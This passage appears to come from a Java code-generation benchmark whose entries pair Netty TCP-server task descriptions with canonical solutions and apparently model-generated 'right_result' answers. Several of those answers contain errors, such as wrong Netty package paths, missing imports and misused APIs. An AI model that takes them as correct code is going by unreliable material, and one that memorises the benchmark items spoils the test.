   public HelloCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            return \"Hello, world!\";\n        }\n    }\n\n    static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            return \"{ \\\"device\\\": \\\"example\\\", \\\"status\\\": \\\"online\\\" }\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 203,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections, process requests, and manage server resources efficiently.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, handles incoming connections using NIO, processes client requests through a pipeline of handlers, and properly manages server resources during startup and shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> void - Starts the Netty server, configures the server bootstrap with event loop groups, channel type, pipeline handlers, and socket options. Binds to the specified port and keeps the server running until shutdown is triggered. Properly releases resources during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                     ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(io.netty.channel.ChannelOption.SO_BACKLOG, 100)\n             .childOption(io.netty.channel.ChannelOption.SO_REUSEADDR, true)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new StringDecoder());\n                     pipeline.addLast(new StringEncoder());\n                     pipeline.addLast(new MyServerHandler());\n                 }\n             });\n            ChannelFuture future = b.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle object serialization and deserialization for client-server communication, with optional SSL support.\n\nClass Description: ObjectEchoServer is a Netty-based TCP server that listens for incoming connections, handles object serialization/deserialization, and echoes received objects back to clients. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- start(): [void] - Starts the Netty server, configures the pipeline with necessary handlers (SSL, object encoder/decoder, and business logic handler), and binds to the specified port. Handles resource cleanup on shutdown.\n  Input: None\n  Output: None (throws Exception if startup fails)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class ObjectEchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoServerHandler());\n                }\n             });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.codec.ObjectDecoder;\nimport io.netty.handler.codec.ObjectEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class ObjectEchoServer {\n    private final boolean ssl;\n    private final int port;\n    private SslContext sslCtx;\n\n    public ObjectEchoServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         sslCtx = new SslContextBuilder().buildServerContext();\n                         p.addLast(sslCtx.newHandler(ch));\n                     }\n                     p.addLast(new ObjectDecoder());\n                     p.addLast(new EchoHandler());\n                     p.addLast(new ObjectEncoder());\n                 }\n             })\n             .childOption(ChannelOption.SO_REUSEADDR, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = b.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static class EchoHandler extends io.netty.handler.codec.ByteToMessageDecoder {\n        @Override\n        protected void decode(io.netty.channel.ChannelHandlerContext ctx, java.util.List<? extends Object> list, List<Object> out) throws Exception {\n            if (list.size() > 0) {\n                out.add(list.get(0));\n            }\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 205,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections and messages, with proper initialization and graceful shutdown.\n\nClass Description: NettyServer is a Spring component that sets up and manages a Netty-based TCP server. It handles server lifecycle including startup and shutdown, and delegates incoming connection handling to a specified handler initializer.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging server events\n- port: Integer - Port number on which the server will listen (injected from configuration)\n- nettyServerHandlerInitializer: NettyServerHandlerInitializer - Handler for initializing channel pipelines (Spring-injected)\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - Active server channel instance\n\nMethods:\n- start() -> void - Initializes and starts the Netty server (annotated with @PostConstruct)\n  - Input: None\n  - Output: None\n  - Throws: InterruptedException if thread is interrupted during startup\n- shutdown() -> void - Gracefully shuts down the server (annotated with @PreDestroy)\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyserverdemo.server.handler.NettyServerHandlerInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\n\n@Component\npublic class NettyServer {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.port}\")\n    private Integer port;\n\n    @Autowired\n    private NettyServerHandlerInitializer nettyServerHandlerInitializer;\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childHandler(nettyServerHandlerInitializer);\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            channel = future.channel();\n            logger.info(\"[start][Netty Server started on port {}]\", port);\n        }\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport org.springframework.beans.factory.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.PreDestroy;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\n\n@Component\npublic class NettyServer {\n    private final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n    @Value(\"${server.port}\")\n    private Integer port;\n    @Autowired\n    private NettyServerHandlerInitializer nettyServerHandlerInitializer;\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(nettyServerHandlerInitializer);\n        ChannelFuture future = bootstrap.bind(port).sync();\n        this.channel = future.channel();\n        logger.info(\"Server started on port {}\", port);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().awaitUninterruptibly();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        logger.info(\"Server shutdown complete\");\n    }\n}"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and messages.\n\nClass Description: SimpleChatServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and provides basic server configuration options.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nSimpleChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the server, binds it to the specified port, and keeps it running until shutdown. Handles resource cleanup during shutdown. Throws Exception if any error occurs during server startup or operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n\n    private int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new SimpleChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.ChannelOption;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.nio.NioServerSocketChannel;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.string.StringDecoder;  \nimport io.netty.handler.codec.string.StringEncoder;  \nimport io.netty.handler.logging.LogLevel;  \nimport io.netty.handler.logging.LoggingHandler;  \nimport io.netty.handler.timeout.IdleStateHandler;  \n\npublic class SimpleChatServer {  \n    private final int port;  \n\n    public SimpleChatServer(int port) {  \n        this.port = port;  \n    }  \n\n    public void run() throws Exception {  \n        EventLoopGroup bossGroup = new NioEventLoopGroup();  \n        EventLoopGroup workerGroup = new NioEventLoopGroup();  \n        try {  \n            Bootstrap bootstrap = new Bootstrap();  \n            bootstrap.group(bossGroup, workerGroup)  \n                     .channel(NioServerSocketChannel.class)  \n                     .option(ChannelOption.SO_REUSEADDR, true)  \n                     .childOption(ChannelOption.SO_KEEPALIVE, true)  \n                     .handler(new ChannelInitializer<SocketChannel>() {  \n                         @Override  \n                         protected void initChannel(SocketChannel ch) {  \n                             ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));  \n                             ch.pipeline().addLast(new StringDecoder());  \n                             ch.pipeline().addLast(new StringEncoder());  \n                             ch.pipeline().addLast(new SimpleChatHandler());  \n                         }  \n                     });  \n\n            ChannelFuture future = bootstrap.bind(port).sync();  \n            future.channel().closeFuture().await();  \n        } finally {  \n            bossGroup.shutdownGracefully();  \n            workerGroup.shutdownGracefully();  \n        }  \n    }  \n\n    static class SimpleChatHandler extends SimpleChannelInboundHandler<String> {  \n        @Override  \n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {  \n            System.out.println(\"Received message: \" + msg);  \n            ctx.writeAndFlush(msg + \" echoed back\");  \n        }  \n\n        @Override  \n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n            cause.printStackTrace();  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 207,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: UptimeServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for server events. The server remains active until explicitly shut down.\n\nAttributes:\n- PORT: int - The port number on which the server listens for incoming connections (default: 8080)\n- handler: UptimeServerHandler - The custom handler that processes incoming client requests\n\nMethods:\n- main: main(String[] args) -> void - The entry point of the application that configures and starts the Netty server\n  - args: String[] - Command line arguments (unused in this implementation)\n  - throws Exception - May throw exceptions during server startup or operation\n\nThe server uses two NioEventLoopGroups:\n1. bossGroup: Handles accepting new connections\n2. workerGroup: Handles processing of established connections\n\nThe server configuration includes:\n- Channel type: NioServerSocketChannel\n- Logging handler: LogLevel.INFO\n- Custom channel initializer that adds the UptimeServerHandler to the pipeline\n\nThe server binds to the specified port and remains running until shutdown. Resources are cleaned up gracefully on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class UptimeServer {\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n    private static final UptimeServerHandler handler = new UptimeServerHandler();\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(handler);\n                        }\n                    });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class UptimeServer {\n    private static final int PORT = 8080;\n    private final UptimeServerHandler handler;\n\n    public UptimeServer() {\n        this.handler = new UptimeServerHandler();\n    }\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                             ch.pipeline().addLast(handler);\n                         }\n                     })\n                     .childOption(ChannelOption.TCP_NODELAY, true)\n                     .option(ChannelOption.SO_BACKLOG, 100);\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 210,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests. The server should be configurable to listen on a specified port and properly manage its resources.\n\nClass Description: HttpServer is a Netty-based TCP server implementation that handles HTTP requests. It manages server lifecycle including startup, shutdown, and resource cleanup. The server uses a boss-worker thread model for handling connections and requests efficiently.\n\nAttributes:\n- DEFAULT_PORT: int - The default port (8080) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent thread group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child thread group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server configuration and startup helper class\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port. Initializes thread groups, configures server options, and binds to the port. Throws Exception if startup fails.\n- stop() -> void - Shuts down the server gracefully by releasing all thread resources\n- main(String[] args) -> void - Entry point that parses command line arguments for port number and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HttpServer {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public void start(int port) throws Exception {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new HttpServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HttpServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        HttpServer server = new HttpServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpServerHandler;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport java.nio.charset.StandardCharsets;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\n\npublic class HttpServer {\n    private static final int DEFAULT_PORT = 8080;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HttpServer() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        ChannelFuture future = bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new HttpServerCodec())\n                                .addLast(new HttpObjectAggregator(65536))\n                                .addLast(new HttpServerHandler());\n                    }\n                })\n                .bind(port);\n        future.sync();\n        if (!future.isSuccess()) {\n            throw new Exception(\"Failed to start server\");\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        try {\n            HttpServer server = new HttpServer();\n            server.start(port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class HttpServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            FullHttpRequest request = (FullHttpRequest) msg;\n            System.out.println(\"Received HTTP request: \" + request);\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n            FullHttpResponse responseMsg = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            responseMsg.content().writeBytes(response.getBytes(StandardCharsets.UTF_8));\n            ctx.write(responseMsg);\n            ctx.flush();\n            ctx.close();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections with non-blocking I/O operations.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nConstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, configures Netty components, and begins listening for connections\nmain: main(String[] args) -> void - Entry point that creates and starts the server instance, using port 8080 by default or a specified port from command line arguments",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        } else {\n            port = 8080;\n        }\n        new TimeServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
